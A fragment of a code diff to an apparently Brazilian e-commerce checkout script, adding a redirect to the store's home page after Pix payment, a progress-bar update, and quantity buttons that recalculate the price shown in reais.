+      window.pixPaymentPollInterval = null;
     }
+    
+    // Redireciona para o domínio principal (página inicial da loja) de forma 100% dinâmica
+    window.location.href = window.location.origin;
   });
 
   // Reiniciar Formulário
@@ -1205,6 +2451,7 @@ document.addEventListener('DOMContentLoaded', () => {
     detectCardBrand('');
     
     calculateTotals();
+    updateTopProgressBar();
   }
 
   // Helper: Gerar UUID v4
@@ -1214,4 +2461,54 @@ document.addEventListener('DOMContentLoaded', () => {
       return v.toString(16);
     });
   }
+
+  // Lógica de quantidade interativa no checkout ativo
+  document.addEventListener('click', (e) => {
+    const minusBtn = e.target.closest('#checkout-qty-minus');
+    const plusBtn = e.target.closest('#checkout-qty-plus');
+    
+    if (minusBtn || plusBtn) {
+      e.preventDefault();
+      const qtyValEl = document.getElementById('checkout-qty-val');
+      if (!qtyValEl) return;
+      
+      let qty = parseInt(qtyValEl.textContent) || 1;
+      if (minusBtn) {
+        if (qty > 1) qty--;
+      } else {
+        qty++;
+      }
+      qtyValEl.textContent = qty;
+      
+      // Atualizar preço de acordo
+      const urlParams = new URLSearchParams(window.location.search);
+      const hasShopifyProduct = urlParams.get('title') && urlParams.get('price');
+      
+      const baseAmountInput = document.getElementById('base-amount');
+      const prodPriceEl = document.getElementById('checkout-product-price-val');
+      
+      let unitPrice = 129.90;
+      
+      if (hasShopifyProduct) {
+        unitPrice = parseFloat(urlParams.get('price')) || 0;
+      } else if (window._currentThemeConfig && window._currentThemeConfig.productPrice !== undefined) {
+        unitPrice = parseFloat(window._currentThemeConfig.productPrice);
+      } else if (baseAmountInput) {
+        // Fallback para preço unitário
+        const currentTotal = parseFloat(baseAmountInput.value) || 129.90;
+        const currentQty = parseInt(minusBtn ? qty + 1 : qty - 1) || 1;
+        unitPrice = parseFloat((currentTotal / currentQty).toFixed(2)) || 129.90;
+      }
+      
+      const newTotal = (unitPrice * qty).toFixed(2);
+      if (baseAmountInput) {
+        baseAmountInput.value = newTotal;
+        baseAmountInput.dispatchEvent(new Event('input'));
+      }
+      
+      if (prodPriceEl) {
+        prodPriceEl.textContent = 'R$ ' + parseFloat(newTotal).toFixed(2).replace('.', ',');
+      }
+    }
+  });
 });
